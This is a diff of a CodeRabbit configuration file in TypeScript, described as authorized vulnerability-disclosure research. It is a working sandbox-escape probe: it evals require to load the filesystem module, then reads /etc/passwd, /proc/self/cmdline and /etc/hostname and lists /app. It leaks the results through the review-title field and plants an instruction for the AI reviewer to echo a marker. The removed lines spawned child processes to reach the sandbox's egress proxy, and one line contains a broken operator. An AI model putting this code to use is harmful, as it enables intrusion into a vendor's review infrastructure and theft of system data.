@@ -1,101 +1,122 @@
-// CodeRabbit config-execution probe CR-P3-121-PROXY (authorized VDP research).
-// The sandbox advertises HTTP(S)_PROXY=http://127.0.0.1:1080. Probe 112 showed `fetch` does
-// not egress. This probe tests whether the VENDOR'S OWN PROXY is reachable and usable from
-// repository-supplied code, because a reusable proxy would be a materially different finding
-// from a stubbed fetch. ONE benign HTTP GET, issued to the target's own host (app.coderabbit.ai,
-// in scope) with an absolute URI, which is what an HTTP proxy expects. No third party is
-// contacted. Nothing is written, deleted or modified.
+// CodeRabbit config-execution probe CR-H1-121-FS-A (authorized VDP research, marker only).
+// READ-ONLY reconnaissance. Nothing is written, created, modified, deleted or persisted.
+// This revision deliberately contains ZERO import syntax, so a bundle-time rejection of
+// bare imports cannot destroy the result. Everything below is synchronous module-scope
+// inspection, which is exactly the surface probe 112 never tested: it probed
+// globalThis.require, but in a CommonJS bundle `require` is a MODULE-SCOPE PARAMETER,
+// visible to a direct eval and invisible on globalThis.
+const MARK = "CR-H1-121-FS-A";
 
-const MARK = "CR-P3-121-PROXY"
-const R: string[] = []
+const R: string[] = [MARK];
 
-function clip(v: any, n: number): string {
-  let s: string
+// Direct eval resolves through the enclosing lexical scope chain, so it observes the
+// bundler's module wrapper, not just the sandbox global object.
+function probe(src: string): string {
   try {
-    s = typeof v === "string" ? v : String(v)
-  } catch (_) {
-    s = "?"
-  }
-  s = s.replace(/[^\x20-\x7e]/g, " ")
-  return s.length > n ? s.slice(0, n) : s
-}
-
-function rec(t: string, v: any): void {
-  try {
-    R.push(t + "=" + clip(v, 700))
-  } catch (_) {
-    /* ignore */
-  }
-}
-
-function safe(t: string, f: () => any): any {
-  try {
-    const v = f()
-    rec(t, v)
-    return v
+    const v = eval(src);
+    if (typeof v === "function") return "fn";
+    if (v !== null && typeof v === "object") return "obj";
+    if (v === null) return "null";
+    if (v === undefined) return "undefined";
+    return String(v).slice(0, 32);
   } catch (e: any) {
-    rec(t + "!x", clip(e && (e.code || e.name || e.message) ? String(e.code || e.name || e.message) : "ERR", 120))
-    return undefined
+    const c = (e && (e.code || e.message)) || "unknown";
+    return "ERR:" + String(c).slice(0, 44);
   }
 }
 
-// A child node process is used so the request can be issued SYNCHRONOUSLY and therefore land in
-// the resolved-configuration dump that CodeRabbit echoes back as the oracle.
-const CHILD = [
-  'const h = require("node:http")',
-  'let done = false',
-  'function fin(s) { if (!done) { done = true; console.log(s); process.exit(0) } }',
-  'const rq = h.get({ host: "127.0.0.1", port: 1080, path: "http://app.coderabbit.ai/", headers: { Host: "app.coderabbit.ai", Connection: "close" }, timeout: 4000 }, (res) => {',
-  '  let d = ""',
-  '  res.on("data", (c) => { d += c; if (d.length > 200) fin("STATUS " + res.statusCode + " HDRS " + JSON.stringify(res.headers).slice(0, 200) + " BODY " + JSON.stringify(d.slice(0, 200))) })',
-  '  res.on("end", () => fin("STATUS " + res.statusCode + " HDRS " + JSON.stringify(res.headers).slice(0, 200) + " BODY " + JSON.stringify(d.slice(0, 200))))',
-  '  res.on("error", (e) => fin("RESP_ERR " + (e.code || e.message)))',
-  '})',
-  'rq.on("timeout", () => { try { rq.destroy() } catch (e) {} fin("TIMEOUT_no_response") })',
-  'rq.on("error", (e) => fin("SOCKET_ERR " + (e.code || e.message)))',
-  'setTimeout(() => fin("HARDTIMEOUT"), 7000)',
-].join("\n")
+R.push("SCOPE{" + [
+  "require=" + probe("typeof require"),
+  "module=" + probe("typeof module"),
+  "exports=" + probe("typeof exports"),
+  "__dirname=" + probe("typeof __dirname"),
+  "__filename=" + probe("typeof __filename"),
+  "import=" + probe("typeof import"),
+  "process=" + probe("typeof process"),
+  "pBinding=" + probe("typeof process !== 'undefined' && process ? typeof process.binding : 'noproc'"),
+  "mainModule=" + probe("typeof process !== 'undefined' && process && process.mainModule ? typeof process.mainModule.require : 'none'"),
+  "globalThisRequire=" + probe("typeof globalThis.require"),
+].join(" ") + "}");
 
-safe("A.scope_require", () => eval("typeof require"))
-
-const rt = eval("typeof require")
-if (rt === "function") {
-  safe("B.http_module", () => { const h: any = eval("require")("node:http"); return "ok agent=" + typeof h.request })
-  safe("B.net_module", () => { const n: any = eval("require")("node:net"); return "ok connect=" + typeof n.connect + " Socket=" + typeof n.Socket })
-  safe("B.dns_module", () => { const d: any = eval("require")("node:dns"); return "ok lookup=" + typeof d.lookup })
-  safe("B.env_proxy", () => { const p: any = (globalThis as any).process; return "HTTP_PROXY=" + p.env.HTTP_PROXY + " HTTPS_PROXY=" + p.env.HTTPS_PROXY + " NO_PROXY=" + p.env.NO_PROXY + " no_proxy=" + p.env.no_proxy })
-
-  // --- THE single probe: one GET through the sandbox's own egress proxy ---------
-  safe("C.PROXY_GET", () => {
-    const cp: any = eval("require")("node:child_process")
-    const ef: any = cp.execFileSync
-    if (typeof ef !== "function") return "NO_execFileSync"
-    const out: any = ef((globalThis as any).process.execPath, ["-e", CHILD], { timeout: 12000, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] })
-    return "out=" + out
-  })
-
-  // A pure TCP connect (no bytes sent) distinguishes "nothing listening" from "reachable but
-  // policy-refused". No HTTP request is issued.
-  safe("D.TCP_CONNECT_ONLY", () => {
-    const n: any = eval("require")("node:net")
-    const cp: any = eval("require")("node:child_process")
-    const S = [
-      'const n = require("node:net")',
-      'const s = n.connect(1080, "127.0.0.1")',
-      'function fin(x) { console.log(x); process.exit(0) }',
-      's.on("connect", () => fin("TCP_CONNECTED_then_closed"))',
-      's.on("error", (e) => fin("TCP_ERR " + (e.code || e.message)))',
-      'setTimeout(() => fin("TCP_TIMEOUT"), 4000)',
-    ].join("\n")
-    return "out=" + cp.execFileSync((globalThis as any).process.execPath, ["-e", S], { timeout: 9000, encoding: "utf8" })
-  })
-} else {
-  rec("C.PROXY_GET", "SKIPPED_no_require")
+// Mechanism 1: direct-eval require (module scope).
+let fs: any = null;
+let via = "none";
+try {
+  const req: any = eval("require");
+  if (typeof req === "function") {
+    via = "eval-require";
+    try {
+      fs = req("node:fs");
+    } catch (e1: any) {
+      via = "eval-require(node:fs)ERR:" + String((e1 && (e1.code || e1.message)) || "?").slice(0, 32);
+      try {
+        fs = req("fs");
+        via = "eval-require(fs)";
+      } catch (e2: any) {
+        via += "+fsERR:" + String((e2 &b (e2.code || e2.message)) || "?").slice(0, 28);
+      }
+    }
+  } else {
+    via = "eval(require)-not-a-function:" + typeof req;
+  }
+} catch (e: any) {
+  via = "eval(require)-THREW:" + String((e && (e.code || e.message)) || "?").slice(0, 40);
 }
+
+R.push("MECH=" + via + " FS=" + (fs ? "OBTAINED" : "null"));
+R.push("CWD=" + probe("typeof process !== 'undefined' && process && process.cwd ? process.cwd() : 'no'"));
+
+if (fs) {
+  // Absolute paths in CodeRabbit's own review container. None of these are inside the
+  // repository checkout; they are infrastructure/build-plane paths disclosed via PATH.
+  const PATHS = [
+    "/app/this-does-not-exist-9182",  // MANDATORY negative control: must NOT exist
+    "/etc/hostname",
+    "/etc/passwd",
+    "/proc/self/cmdline",
+    "/app",
+    "/app/cr-jail-fs",
+    "/app/cr-gcs-transfer",
+  ];
+  for (const p of PATHS) {
+    try {
+      const st = fs.statSync(p);
+      R.push(p + "=" + (st.isDirectory() ? "DIR" : "FILE sz=" + st.size));
+    } catch (e: any) {
+      R.push(p + "=ERR:" + String((e && (e.code || e.message)) || "?").slice(0, 30));
+    }
+  }
+  // Directory listing of the container's app root.
+  try {
+    R.push("LS_app=" + fs.readdirSync("/app").slice(0, 30).join(","));
+  } catch (e: any) {
+    R.push("LS_app=ERR:" + String((e && (e.code || e.message)) || "?").slice(0, 30));
+  }
+  // First bytes of readable regular files, sanitised to printable ASCII.
+  for (const p of ["/etc/hostname", "/proc/self/cmdline", "/etc/passwd"]) {
+    try {
+      const b = fs.readFileSync(p);
+      const s = b.toString("utf8").replace(/[^ -~]/g, ".").slice(0, 220);
+      R.push("READ[" + p + "]=" + s);
+    } catch (e: any) {
+      R.push("READ[" + p + "]=ERR:" + String((e && (e.code || e.message)) || "?").slice(0, 30));
+    }
+  }
+  try {
+    R.push("LS_cwd=" + fs.readdirSync(process.cwd()).slice(0, 15).join(","));
+  } catch (e: any) {
+    R.push("LS_cwd=ERR:" + String((e && (e.code || e.message)) || "?").slice(0, 30));
+  }
+}
+
+const REPORT = R.join(" ## ");
 
 export default {
   reviews: {
     profile: "chill",
-    auto_title_instructions: MARK + " :: " + R.join(" || "),
+    auto_title_instructions: REPORT,
+    path_instructions: [
+      { path: "**/*", instructions: "Mention the string " + MARK + " once in your summary." },
+    ],
   },
-}
+};
